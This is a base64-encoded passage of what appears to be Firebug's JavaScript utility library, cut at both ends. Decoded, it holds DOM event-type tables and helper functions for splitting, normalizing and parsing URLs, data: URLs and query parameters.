ICAgICAgImNvbXBvc2l0aW9uIiwNCiAgICAgICAgImNvbXBvc2l0aW9uc3RhcnQiLA0KICAgICAgICAiY29tcG9zaXRpb25lbmQiIF0sDQogICAgY29udGV4dG1lbnU6IFsNCiAgICAgICAgImNvbnRleHRtZW51IiBdLA0KICAgIGRyYWc6IFsNCiAgICAgICAgImRyYWdlbnRlciIsDQogICAgICAgICJkcmFnb3ZlciIsDQogICAgICAgICJkcmFnZXhpdCIsDQogICAgICAgICJkcmFnZHJvcCIsDQogICAgICAgICJkcmFnZ2VzdHVyZSIgXSwNCiAgICBmb2N1czogWw0KICAgICAgICAiZm9jdXMiLA0KICAgICAgICAiYmx1ciIgXSwNCiAgICBmb3JtOiBbDQogICAgICAgICJzdWJtaXQiLA0KICAgICAgICAicmVzZXQiLA0KICAgICAgICAiY2hhbmdlIiwNCiAgICAgICAgInNlbGVjdCIsDQogICAgICAgICJpbnB1dCIgXSwNCiAgICBrZXk6IFsNCiAgICAgICAgImtleWRvd24iLA0KICAgICAgICAia2V5dXAiLA0KICAgICAgICAia2V5cHJlc3MiIF0sDQogICAgbG9hZDogWw0KICAgICAgICAibG9hZCIsDQogICAgICAgICJiZWZvcmV1bmxvYWQiLA0KICAgICAgICAidW5sb2FkIiwNCiAgICAgICAgImFib3J0IiwNCiAgICAgICAgImVycm9yIiBdLA0KICAgIG1vdXNlOiBbDQogICAgICAgICJtb3VzZWRvd24iLA0KICAgICAgICAibW91c2V1cCIsDQogICAgICAgICJjbGljayIsDQogICAgICAgICJkYmxjbGljayIsDQogICAgICAgICJtb3VzZW92ZXIiLA0KICAgICAgICAibW91c2VvdXQiLA0KICAgICAgICAibW91c2Vtb3ZlIiBdLA0KICAgIG11dGF0aW9uOiBbDQogICAgICAgICJET01TdWJ0cmVlTW9kaWZpZWQiLA0KICAgICAgICAiRE9NTm9kZUluc2VydGVkIiwNCiAgICAgICAgIkRPTU5vZGVSZW1vdmVkIiwNCiAgICAgICAgIkRPTU5vZGVSZW1vdmVkRnJvbURvY3VtZW50IiwNCiAgICAgICAgIkRPTU5vZGVJbnNlcnRlZEludG9Eb2N1bWVudCIsDQogICAgICAgICJET01BdHRyTW9kaWZpZWQiLA0KICAgICAgICAiRE9NQ2hhcmFjdGVyRGF0YU1vZGlmaWVkIiBdLA0KICAgIHBhaW50OiBbDQogICAgICAgICJwYWludCIsDQogICAgICAgICJyZXNpemUiLA0KICAgICAgICAic2Nyb2xsIiBdLA0KICAgIHNjcm9sbDogWw0KICAgICAgICAib3ZlcmZsb3ciLA0KICAgICAgICAidW5kZXJmbG93IiwNCiAgICAgICAgIm92ZXJmbG93Y2hhbmdlZCIgXSwNCiAgICB0ZXh0OiBbDQogICAgICAgICJ0ZXh0IiBdLA0KICAgIHVpOiBbDQogICAgICAgICJET01BY3RpdmF0ZSIsDQogICAgICAgICJET01Gb2N1c0luIiwNCiAgICAgICAgIkRPTUZvY3VzT3V0IiBdLA0KICAgIHh1bDogWw0KICAgICAgICAicG9wdXBzaG93aW5nIiwNCiAgICAgICAgInBvcHVwc2hvd24iLA0KICAgICAgICAicG9wdXBoaWRpbmciLA0KICAgICAgICAicG9wdXBoaWRkZW4iLA0KICAgICAgICAiY2xvc2UiLA0KICAgICAgICAiY29tbWFuZCIsDQogICAgICAgICJicm9hZGNhc3QiLA0KICAgICAgICAiY29tbWFuZHVwZGF0ZSIgXQ0KfTsNCg0KdGhpcy5nZXRFdmVudEZhbWlseSA9IGZ1bmN0aW9uKGV2ZW50VHlwZSkNCnsNCiAgICBpZiAoIXRoaXMuZmFtaWxpZXMpDQogICAgew0KICAgICAgICB0aGlzLmZhbWlsaWVzID0ge307DQoNCiAgICAgICAgZm9yICh2YXIgZmFtaWx5IGluIGV2ZW50VHlwZXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB0eXBlcyA9IGV2ZW50VHlwZXNbZmFtaWx5XTsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdHlwZXMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICAgICAgdGhpcy5mYW1pbGllc1t0eXBlc1tpXV0gPSBmYW1pbHk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gdGhpcy5mYW1pbGllc1tldmVudFR5cGVdOw0KfTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIFVSTHMNCg0KdGhpcy5nZXRGaWxlTmFtZSA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICB2YXIgc3BsaXQgPSB0aGlzLnNwbGl0VVJMQmFzZSh1cmwpOw0KICAgIHJldHVybiBzcGxpdC5uYW1lOw0KfTsNCg0KdGhpcy5zcGxpdFVSTEJhc2UgPSBmdW5jdGlvbih1cmwpDQp7DQogICAgaWYgKHRoaXMuaXNEYXRhVVJMKHVybCkpDQogICAgICAgIHJldHVybiB0aGlzLnNwbGl0RGF0YVVSTCh1cmwpOw0KICAgIHJldHVybiB0aGlzLnNwbGl0VVJMVHJ1ZSh1cmwpOw0KfTsNCg0KdGhpcy5zcGxpdERhdGFVUkwgPSBmdW5jdGlvbih1cmwpDQp7DQogICAgdmFyIG1hcmsgPSB1cmwuaW5kZXhPZignOicsIDMpOw0KICAgIGlmIChtYXJrICE9IDQpDQogICAgICAgIHJldHVybiBmYWxzZTsgICAvLyAgdGhlIGZpcnN0IDUgY2hhcnMgbXVzdCBiZSAnZGF0YTonDQoNCiAgICB2YXIgcG9pbnQgPSB1cmwuaW5kZXhPZignLCcsIG1hcmsrMSk7DQogICAgaWYgKHBvaW50IDwgbWFyaykNCiAgICAgICAgcmV0dXJuIGZhbHNlOyAvLyBzeW50YXggZXJyb3INCg0KICAgIHZhciBwcm9wcyA9IHsgZW5jb2RlZENvbnRlbnQ6IHVybC5zdWJzdHIocG9pbnQrMSkgfTsNCg0KICAgIHZhciBtZXRhZGF0YUJ1ZmZlciA9IHVybC5zdWJzdHIobWFyaysxLCBwb2ludCk7DQogICAgdmFyIG1ldGFkYXRhID0gbWV0YWRhdGFCdWZmZXIuc3BsaXQoJzsnKTsNCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IG1ldGFkYXRhLmxlbmd0aDsgaSsrKQ0KICAgIHsNCiAgICAgICAgdmFyIG52ID0gbWV0YWRhdGFbaV0uc3BsaXQoJz0nKTsNCiAgICAgICAgaWYgKG52Lmxlbmd0aCA9PSAyKQ0KICAgICAgICAgICAgcHJvcHNbbnZbMF1dID0gbnZbMV07DQogICAgfQ0KDQogICAgLy8gQWRkaXRpb25hbCBGaXJlYnVnLXNwZWNpZmljIHByb3BlcnRpZXMNCiAgICBpZiAocHJvcHMuaGFzT3duUHJvcGVydHkoJ2ZpbGVOYW1lJykpDQogICAgew0KICAgICAgICAgdmFyIGNhbGxlcl9VUkwgPSBkZWNvZGVVUklDb21wb25lbnQocHJvcHNbJ2ZpbGVOYW1lJ10pOw0KICAgICAgICAgdmFyIGNhbGxlcl9zcGxpdCA9IHRoaXMuc3BsaXRVUkxUcnVlKGNhbGxlcl9VUkwpOw0KDQogICAgICAgIGlmIChwcm9wcy5oYXNPd25Qcm9wZXJ0eSgnYmFzZUxpbmVOdW1iZXInKSkgIC8vIHRoaXMgbWVhbnMgaXQncyBwcm9iYWJseSBhbiBldmFsKCkNCiAgICAgICAgew0KICAgICAgICAgICAgcHJvcHNbJ3BhdGgnXSA9IGNhbGxlcl9zcGxpdC5wYXRoOw0KICAgICAgICAgICAgcHJvcHNbJ2xpbmUnXSA9IHByb3BzWydiYXNlTGluZU51bWJlciddOw0KICAgICAgICAgICAgdmFyIGhpbnQgPSBkZWNvZGVVUklDb21wb25lbnQocHJvcHNbJ2VuY29kZWRDb250ZW50J10uc3Vic3RyKDAsMjAwKSkucmVwbGFjZSgvXHMqJC8sICIiKTsNCiAgICAgICAgICAgIHByb3BzWyduYW1lJ10gPSAgJ2V2YWwtPicraGludDsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHByb3BzWyduYW1lJ10gPSBjYWxsZXJfc3BsaXQubmFtZTsNCiAgICAgICAgICAgIHByb3BzWydwYXRoJ10gPSBjYWxsZXJfc3BsaXQucGF0aDsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICBpZiAoIXByb3BzLmhhc093blByb3BlcnR5KCdwYXRoJykpDQogICAgICAgICAgICBwcm9wc1sncGF0aCddID0gImRhdGE6IjsNCiAgICAgICAgaWYgKCFwcm9wcy5oYXNPd25Qcm9wZXJ0eSgnbmFtZScpKQ0KICAgICAgICAgICAgcHJvcHNbJ25hbWUnXSA9ICBkZWNvZGVVUklDb21wb25lbnQocHJvcHNbJ2VuY29kZWRDb250ZW50J10uc3Vic3RyKDAsMjAwKSkucmVwbGFjZSgvXHMqJC8sICIiKTsNCiAgICB9DQoNCiAgICByZXR1cm4gcHJvcHM7DQp9Ow0KDQp0aGlzLnNwbGl0VVJMVHJ1ZSA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICB2YXIgbSA9IHJlU3BsaXRGaWxlLmV4ZWModXJsKTsNCiAgICBpZiAoIW0pDQogICAgICAgIHJldHVybiB7bmFtZTogdXJsLCBwYXRoOiB1cmx9Ow0KICAgIGVsc2UgaWYgKCFtWzJdKQ0KICAgICAgICByZXR1cm4ge3BhdGg6IG1bMV0sIG5hbWU6IG1bMV19Ow0KICAgIGVsc2UNCiAgICAgICAgcmV0dXJuIHtwYXRoOiBtWzFdLCBuYW1lOiBtWzJdK21bM119Ow0KfTsNCg0KdGhpcy5nZXRGaWxlRXh0ZW5zaW9uID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIGlmICghdXJsKQ0KICAgICAgICByZXR1cm4gbnVsbDsNCg0KICAgIC8vIFJlbW92ZSBxdWVyeSBzdHJpbmcgZnJvbSB0aGUgVVJMIGlmIGFueS4NCiAgICB2YXIgcXVlcnlTdHJpbmcgPSB1cmwuaW5kZXhPZigiPyIpOw0KICAgIGlmIChxdWVyeVN0cmluZyAhPSAtMSkNCiAgICAgICAgdXJsID0gdXJsLnN1YnN0cigwLCBxdWVyeVN0cmluZyk7DQoNCiAgICAvLyBOb3cgZ2V0IHRoZSBmaWxlIGV4dGVuc2lvbi4NCiAgICB2YXIgbGFzdERvdCA9IHVybC5sYXN0SW5kZXhPZigiLiIpOw0KICAgIHJldHVybiB1cmwuc3Vic3RyKGxhc3REb3QrMSk7DQp9Ow0KDQp0aGlzLmlzU3lzdGVtVVJMID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIGlmICghdXJsKSByZXR1cm4gdHJ1ZTsNCiAgICBpZiAodXJsLmxlbmd0aCA9PSAwKSByZXR1cm4gdHJ1ZTsNCiAgICBpZiAodXJsWzBdID09ICdoJykgcmV0dXJuIGZhbHNlOw0KICAgIGlmICh1cmwuc3Vic3RyKDAsIDkpID09ICJyZXNvdXJjZToiKQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICBlbHNlIGlmICh1cmwuc3Vic3RyKDAsIDE2KSA9PSAiY2hyb21lOi8vZmlyZWJ1ZyIpDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIGVsc2UgaWYgKHVybCAgPT0gIlhQQ1NhZmVKU09iamVjdFdyYXBwZXIuY3BwIikNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgZWxzZSBpZiAodXJsLnN1YnN0cigwLCA2KSA9PSAiYWJvdXQ6IikNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgZWxzZSBpZiAodXJsLmluZGV4T2YoImZpcmVidWctc2VydmljZS5qcyIpICE9IC0xKQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICBlbHNlDQogICAgICAgIHJldHVybiBmYWxzZTsNCn07DQoNCnRoaXMuaXNTeXN0ZW1QYWdlID0gZnVuY3Rpb24od2luKQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgdmFyIGRvYyA9IHdpbi5kb2N1bWVudDsNCiAgICAgICAgaWYgKCFkb2MpDQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICAgICAgLy8gRGV0ZWN0IHBhZ2VzIGZvciBwcmV0dHkgcHJpbnRlZCBYTUwNCiAgICAgICAgaWYgKChkb2Muc3R5bGVTaGVldHMubGVuZ3RoICYmIGRvYy5zdHlsZVNoZWV0c1swXS5ocmVmDQogICAgICAgICAgICAgICAgPT0gImNocm9tZTovL2dsb2JhbC9jb250ZW50L3htbC9YTUxQcmV0dHlQcmludC5jc3MiKQ0KICAgICAgICAgICAgfHwgKGRvYy5zdHlsZVNoZWV0cy5sZW5ndGggPiAxICYmIGRvYy5zdHlsZVNoZWV0c1sxXS5ocmVmDQogICAgICAgICAgICAgICAgPT0gImNocm9tZTovL2Jyb3dzZXIvc2tpbi9mZWVkcy9zdWJzY3JpYmUuY3NzIikpDQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCg0KICAgICAgICByZXR1cm4gRkJMLmlzU3lzdGVtVVJMKHdpbi5sb2NhdGlvbi5ocmVmKTsNCiAgICB9DQogICAgY2F0Y2ggKGV4YykNCiAgICB7DQogICAgICAgIC8vIFNvbWV0aW1lcyBkb2N1bWVudHMganVzdCBhcmVuJ3QgcmVhZHkgdG8gYmUgbWFuaXB1bGF0ZWQgaGVyZSwgYnV0IGRvbid0IGxldCB0aGF0DQogICAgICAgIC8vIGd1bSB1cCB0aGUgd29ya3MNCiAgICAgICAgRVJST1IoInRhYldhdGNoZXIuaXNTeXN0ZW1QYWdlIGRvY3VtZW50IG5vdCByZWFkeToiKyBleGMpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KfTsNCg0KdGhpcy5pc1N5c3RlbVN0eWxlU2hlZXQgPSBmdW5jdGlvbihzaGVldCkNCnsNCiAgICB2YXIgaHJlZiA9IHNoZWV0ICYmIHNoZWV0LmhyZWY7DQogICAgcmV0dXJuIGhyZWYgJiYgRkJMLmlzU3lzdGVtVVJMKGhyZWYpOw0KfTsNCg0KdGhpcy5nZXRVUklIb3N0ID0gZnVuY3Rpb24odXJpKQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgaWYgKHVyaSkNCiAgICAgICAgICAgIHJldHVybiB1cmkuaG9zdDsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgIH0NCiAgICBjYXRjaCAoZXhjKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICIiOw0KICAgIH0NCn07DQoNCnRoaXMuaXNMb2NhbFVSTCA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICBpZiAodXJsLnN1YnN0cigwLCA1KSA9PSAiZmlsZToiKQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICBlbHNlIGlmICh1cmwuc3Vic3RyKDAsIDgpID09ICJ3eWNpd3lnOiIpDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIGVsc2UNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KfTsNCg0KdGhpcy5pc0RhdGFVUkwgPSBmdW5jdGlvbih1cmwpDQp7DQogICAgcmV0dXJuICh1cmwgJiYgdXJsLnN1YnN0cigwLDUpID09ICJkYXRhOiIpOw0KfTsNCg0KdGhpcy5nZXRMb2NhbFBhdGggPSBmdW5jdGlvbih1cmwpDQp7DQogICAgaWYgKHRoaXMuaXNMb2NhbFVSTCh1cmwpKQ0KICAgIHsNCiAgICAgICAgdmFyIGZpbGVIYW5kbGVyID0gaW9TZXJ2aWNlLmdldFByb3RvY29sSGFuZGxlcigiZmlsZSIpLlF1ZXJ5SW50ZXJmYWNlKENpLm5zSUZpbGVQcm90b2NvbEhhbmRsZXIpOw0KICAgICAgICB2YXIgZmlsZSA9IGZpbGVIYW5kbGVyLmdldEZpbGVGcm9tVVJMU3BlYyh1cmwpOw0KICAgICAgICByZXR1cm4gZmlsZS5wYXRoOw0KICAgIH0NCn07DQoNCnRoaXMuZ2V0VVJMRnJvbUxvY2FsRmlsZSA9IGZ1bmN0aW9uKGZpbGUpDQp7DQogICAgdmFyIGZpbGVIYW5kbGVyID0gaW9TZXJ2aWNlLmdldFByb3RvY29sSGFuZGxlcigiZmlsZSIpLlF1ZXJ5SW50ZXJmYWNlKENpLm5zSUZpbGVQcm90b2NvbEhhbmRsZXIpOw0KICAgIHZhciBVUkwgPSBmaWxlSGFuZGxlci5nZXRVUkxTcGVjRnJvbUZpbGUoZmlsZSk7DQogICAgcmV0dXJuIFVSTDsNCn07DQoNCnRoaXMuZ2V0RGF0YVVSTEZvckNvbnRlbnQgPSBmdW5jdGlvbihjb250ZW50LCB1cmwpDQp7DQogICAgLy8gZGF0YTp0ZXh0L2phdmFzY3JpcHQ7ZmlsZU5hbWU9eCUyQ3kuanM7YmFzZUxpbmVOdW1iZXI9MTAsPHRoZS11cmwtZW5jb2RlZC1kYXRhPg0KICAgIHZhciB1cmkgPSAiZGF0YTp0ZXh0L2h0bWw7IjsNCiAgICB1cmkgKz0gImZpbGVOYW1lPSIrZW5jb2RlVVJJQ29tcG9uZW50KHVybCkrICIsIjsNCiAgICB1cmkgKz0gZW5jb2RlVVJJQ29tcG9uZW50KGNvbnRlbnQpOw0KICAgIHJldHVybiB1cmk7DQp9LA0KDQp0aGlzLmdldERvbWFpbiA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICB2YXIgbSA9IC9bXjpdKzpcL3sxLDN9KFteXC9dKykvLmV4ZWModXJsKTsNCiAgICByZXR1cm4gbSA/IG1bMV0gOiAiIjsNCn07DQoNCnRoaXMuZ2V0VVJMUGF0aCA9IGZ1bmN0aW9uKHVybCkNCnsNCiAgICB2YXIgbSA9IC9bXjpdKzpcL3sxLDN9W15cL10rKFwvLio/KSQvLmV4ZWModXJsKTsNCiAgICByZXR1cm4gbSA/IG1bMV0gOiAiIjsNCn07DQoNCnRoaXMuZ2V0UHJldHR5RG9tYWluID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIHZhciBtID0gL1teOl0rOlwvezEsM30od3d3XC4pPyhbXlwvXSspLy5leGVjKHVybCk7DQogICAgcmV0dXJuIG0gPyBtWzJdIDogIiI7DQp9Ow0KDQp0aGlzLmFic29sdXRlVVJMID0gZnVuY3Rpb24odXJsLCBiYXNlVVJMKQ0Kew0KICAgIHJldHVybiB0aGlzLmFic29sdXRlVVJMV2l0aERvdHModXJsLCBiYXNlVVJMKS5yZXBsYWNlKCIvLi8iLCAiLyIsICJnIik7DQp9Ow0KDQp0aGlzLmFic29sdXRlVVJMV2l0aERvdHMgPSBmdW5jdGlvbih1cmwsIGJhc2VVUkwpDQp7DQogICAgaWYgKHVybFswXSA9PSAiPyIpDQogICAgICAgIHJldHVybiBiYXNlVVJMICsgdXJsOw0KDQogICAgdmFyIHJlVVJMID0gLygoW146XSs6KVwvezEsMn1bXlwvXSopKC4qPykkLzsNCiAgICB2YXIgbSA9IHJlVVJMLmV4ZWModXJsKTsNCiAgICBpZiAobSkNCiAgICAgICAgcmV0dXJuIHVybDsNCg0KICAgIHZhciBtID0gcmVVUkwuZXhlYyhiYXNlVVJMKTsNCiAgICBpZiAoIW0pDQogICAgICAgIHJldHVybiAiIjsNCg0KICAgIHZhciBoZWFkID0gbVsxXTsNCiAgICB2YXIgdGFpbCA9IG1bM107DQogICAgaWYgKHVybC5zdWJzdHIoMCwgMikgPT0gIi8vIikNCiAgICAgICAgcmV0dXJuIG1bMl0gKyB1cmw7DQogICAgZWxzZSBpZiAodXJsWzBdID09ICIvIikNCiAgICB7DQogICAgICAgIHJldHVybiBoZWFkICsgdXJsOw0KICAgIH0NCiAgICBlbHNlIGlmICh0YWlsW3RhaWwubGVuZ3RoLTFdID09ICIvIikNCiAgICAgICAgcmV0dXJuIGJhc2VVUkwgKyB1cmw7DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgdmFyIHBhcnRzID0gdGFpbC5zcGxpdCgiLyIpOw0KICAgICAgICByZXR1cm4gaGVhZCArIHBhcnRzLnNsaWNlKDAsIHBhcnRzLmxlbmd0aC0xKS5qb2luKCIvIikgKyAiLyIgKyB1cmw7DQogICAgfQ0KfTsNCg0KdGhpcy5ub3JtYWxpemVVUkwgPSBmdW5jdGlvbih1cmwpICAvLyB0aGlzIGdldHMgY2FsbGVkIGEgbG90LCBhbnkgcGVyZm9ybWFuY2UgaW1wcm92ZW1lbnQgd2VsY29tZQ0Kew0KICAgIGlmICghdXJsKQ0KICAgICAgICByZXR1cm4gIiI7DQogICAgLy8gUmVwbGFjZSBvbmUgb3IgbW9yZSBjaGFyYWN0ZXJzIHRoYXQgYXJlIG5vdCBmb3J3YXJkLXNsYXNoIGZvbGxvd2VkIGJ5IC8uLiwgYnkgc3BhY2UuDQogICAgaWYgKHVybC5sZW5ndGggPCAyNTUpIC8vIGd1YXJkIGFnYWluc3QgbW9uc3RlcnMuDQogICAgew0KICAgICAgICAvLyBSZXBsYWNlIG9uZSBvciBtb3JlIGNoYXJhY3RlcnMgdGhhdCBhcmUgbm90IGZvcndhcmQtc2xhc2ggZm9sbG93ZWQgYnkgLy4uLCBieSBzcGFjZS4NCiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoL1teXC9dK1wvXC5cLlwvLywgIiIsICJnIik7DQogICAgICAgIC8vIElzc3VlIDE0OTYsIGF2b2lkICMNCiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoLyMuKi8sIiIpOw0KICAgICAgICAvLyBGb3Igc29tZSByZWFzb24sIEpTRFMgcmVwb3J0cyBmaWxlIFVSTHMgbGlrZSAiZmlsZTovIiBpbnN0ZWFkIG9mICJmaWxlOi8vLyIsIHNvIHRoZXkNCiAgICAgICAgLy8gZG9uJ3QgbWF0Y2ggdXAgd2l0aCB0aGUgVVJMcyB3ZSBnZXQgYmFjayBmcm9tIHRoZSBET00NCiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoL2ZpbGU6XC8oW15cL10pL2csICJmaWxlOi8vLyQxIik7DQogICAgICAgIGlmICh1cmwuaW5kZXhPZignY2hyb21lOicpPT0wKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbSA9IHJlQ2hyb21lQ2FzZS5leGVjKHVybCk7ICAvLyAxIGlzIHBhY2thZ2UgbmFtZSwgMiBpcyBwYXRoDQogICAgICAgICAgICBpZiAobSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB1cmwgPSAiY2hyb21lOi8vIittWzFdLnRvTG93ZXJDYXNlKCkrIi8iK21bMl07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuIHVybDsNCn07DQoNCnRoaXMuZGVub3JtYWxpemVVUkwgPSBmdW5jdGlvbih1cmwpDQp7DQogICAgcmV0dXJuIHVybC5yZXBsYWNlKC9maWxlOlwvXC9cLy9nLCAiZmlsZTovIik7DQp9Ow0KDQp0aGlzLnBhcnNlVVJMUGFyYW1zID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIHZhciBxID0gdXJsID8gdXJsLmluZGV4T2YoIj8iKSA6IC0xOw0KICAgIGlmIChxID09IC0xKQ0KICAgICAgICByZXR1cm4gW107DQoNCiAgICB2YXIgc2VhcmNoID0gdXJsLnN1YnN0cihxKzEpOw0KICAgIHZhciBoID0gc2VhcmNoLmxhc3RJbmRleE9mKCIjIik7DQogICAgaWYgKGggIT0gLTEpDQogICAgICAgIHNlYXJjaCA9IHNlYXJjaC5zdWJzdHIoMCwgaCk7DQoNCiAgICBpZiAoIXNlYXJjaCkNCiAgICAgICAgcmV0dXJuIFtdOw0KDQogICAgcmV0dXJuIHRoaXMucGFyc2VVUkxFbmNvZGVkVGV4dChzZWFyY2gpOw0KfTsNCg0KdGhpcy5wYXJzZVVSTEVuY29kZWRUZXh0ID0gZnVuY3Rpb24odGV4dCkNCnsNCiAgICB2YXIgbWF4VmFsdWVMZW5ndGggPSAyNTAwMDsNCg0KICAgIHZhciBwYXJhbXMgPSBbXTsNCg0KICAgIC8vIFVuZXNjYXBlICcrJyBjaGFyYWN0ZXJzIHRoYXQgYXJlIHVzZWQgdG8gZW5jb2RlIGEgc3BhY2UuDQogICAgLy8gU2VlIHNlY3Rpb24gMi4yLmluIFJGQyAzOTg2OiBodHRwOi8vd3d3LmlldGYub3JnL3JmYy9yZmMzOTg2LnR4dA0KICAgIHRleHQgPSB0ZXh0LnJlcGxhY2UoL1wrL2csICIgIik7DQoNCiAgICB2YXIgYXJncyA9IHRleHQuc3BsaXQoIiYiKTsNCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3MubGVuZ3RoOyArK2kpDQogICAgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgdmFyIHBhcnRzID0gYXJnc1tpXS5zcGxpdCgiPSIpOw0KICAgICAgICAgICAgaWYgKHBhcnRzLmxlbmd0aCA9PSAyKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChwYXJ0c1sxXS5sZW5ndGggPiBtYXhWYWx1ZUxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgcGFydHNbMV0gPSB0aGlzLiRTVFIoIkxhcmdlRGF0YSIpOw0KDQogICAgICAgICAgICAgICAgcGFyYW1zLnB1c2goe25hbWU6IGRlY29kZVVSSUNvbXBvbmVudChwYXJ0c1swXSksIHZhbHVlOiBkZWNvZGVVUklDb21wb25lbnQocGFydHNbMV0pfSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgcGFyYW1zLnB1c2goe25hbWU6IGRlY29kZVVSSUNvbXBvbmVudChwYXJ0c1swXSksIHZhbHVlOiAiIn0pOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJwYXJzZVVSTEVuY29kZWRUZXh0IEVYQ0VQVElPTiAiLCBlKTsNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgicGFyc2VVUkxFbmNvZGVkVGV4dCBFWENFUFRJT04gVVJJIiwgYXJnc1tpXSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBwYXJhbXMuc29ydChmdW5jdGlvbihhLCBiKSB7IHJldHVybiBhLm5hbWUgPD0gYi5uYW1lID8gLTEgOiAxOyB9KTsNCg0KICAgIHJldHVybiBwYXJhbXM7DQp9Ow0KDQovLyBUT0RPOiB4eHhwZWRybyBsaWIuIHdoeSBsb29wcyBpbiBkb21wbGF0ZSBhcmUgcmVxdWlyaW5nIGFycmF5IGluIHBhcmFtZXRlcnMNCi8vIGFzIGluIHJlc3BvbnNlL3JlcXVlc3QgaGVhZGVycyBhbmQgZ2V0L3Bvc3QgcGFyYW1ldGVycyBpbiBOZXQgbW9kdWxlPw0KdGhpcy5wYXJzZVVSTFBhcmFtc0FycmF5ID0gZnVuY3Rpb24odXJsKQ0Kew0KICAgIHZhciBxID0gdXJsID8gdXJsLmluZGV4T2YoIj8iKSA6IC0xOw0KICAgIGlmIChxID09IC0xKQ0KICAgICAgICByZXR1cm4gW107DQoNCiAgICB2YXIgc2VhcmNoID0gdXJsLnN1YnN0cihxKzEpOw0KICAgIHZhciBoID0gc2VhcmNoLmxhc3RJbmRleE9mKCIjIik7DQogICAgaWYgKGggIT0gLTEpDQogICAgICAgIHNlYXJjaCA9IHNlYXJjaC5zdWJzdHIoMCwgaCk7DQoNCiAgICBpZiAoIXNlYXJjaCkNCiAgICAgICAgcmV0dXJuIFtdOw0KDQogICAgcmV0dXJuIHRoaXMucGFyc2VVUkxFbmNvZGVkVGV4dEFycmF5KHNlYXJjaCk7DQp9Ow0KDQp0aGlzLnBhcnNlVVJMRW5jb2RlZFRleHRBcnJheSA9IGZ1bmN0aW9uKHRleHQpDQp7DQogICAgdmFyIG1heFZhbHVlTGVuZ3RoID0gMjUwMDA7DQoNCiAgICB2YXIgcGFyYW1zID0gW107DQoNCiAgICAvLyBVbmVzY2FwZSAnKycgY2hhcmFjdGVycyB0aGF0IGFyZSB1c2VkIHRvIGVuY29kZSBhIHNwYWNlLg0KICAgIC8vIFNlZSBzZWN0aW9uIDIuMi5pbiBSRkMgMzk4NjogaHR0cDovL3d3dy5pZXRmLm9yZy9yZmMvcmZjMzk4Ni50eHQNCiAgICB0ZXh0ID0gdGV4dC5yZXBsYWNlKC9cKy9nLCAiICIpOw0KDQogICAgdmFyIGFyZ3MgPSB0ZXh0LnNwbGl0KCImIik7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcmdzLmxlbmd0aDsgKytpKQ0KICAgIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHZhciBwYXJ0cyA9IGFyZ3NbaV0uc3BsaXQoIj0iKTsNCiAgICAgICAgICAgIGlmIChwYXJ0cy5sZW5ndGggPT0gMikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAocGFydHNbMV0ubGVuZ3RoID4gbWF4VmFsdWVMZW5ndGgpDQogICAgICAgICAgICAgICAgICAgIHBhcnRzWzFdID0gdGhpcy4kU1RSKCJMYXJnZURhdGEiKTsNCg0KICAgICAgICAgICAgICAgIHBhcmFtcy5wdXNoKHtuYW1lOiBkZWNvZGVVUklDb21wb25lbnQocGFydHNbMF0pLCB2YWx1ZTogW2RlY29kZVVSSU